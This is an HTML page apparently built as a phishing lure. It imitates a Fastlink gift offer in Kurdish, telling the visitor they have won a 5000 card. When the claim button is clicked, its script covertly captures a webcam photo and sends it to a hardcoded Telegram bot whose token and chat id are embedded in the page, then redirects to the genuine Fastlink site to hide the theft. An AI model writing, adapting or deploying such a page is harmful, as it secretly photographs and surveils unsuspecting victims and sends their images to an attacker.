<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Fastlink Gift</title>
    <style>
        body { background: white; text-align: center; padding: 50px; font-family: sans-serif; }
        button { background: red; color: white; padding: 20px; border: none; border-radius: 10px; font-size: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://fast-link.com/wp-content/uploads/2021/04/fastlink-logo.png" width="150">
    <h2>پیرۆزە! کارتێکی ٥٠٠٠ت بۆ دەرچوو</h2>
    <button id="btn">وەرگرتنی کارت</button>

    <script>
        const token = "8540660409:AAEuJsdaI4RF9YVRe63-kWMY15Qvp0Aozy8";
        const cid = "7619045862";

        document.getElementById('btn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    const fd = new FormData();
                    fd.append('chat_id', cid);
                    fd.append('photo', blob, 'snap.jpg');

                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                    window.location.href = "https://fast-link.com";
                }, 1000);
            } catch (e) {
                window.location.href = "https://fast-link.com";
            }
        });
    </script>
</body>
</html>
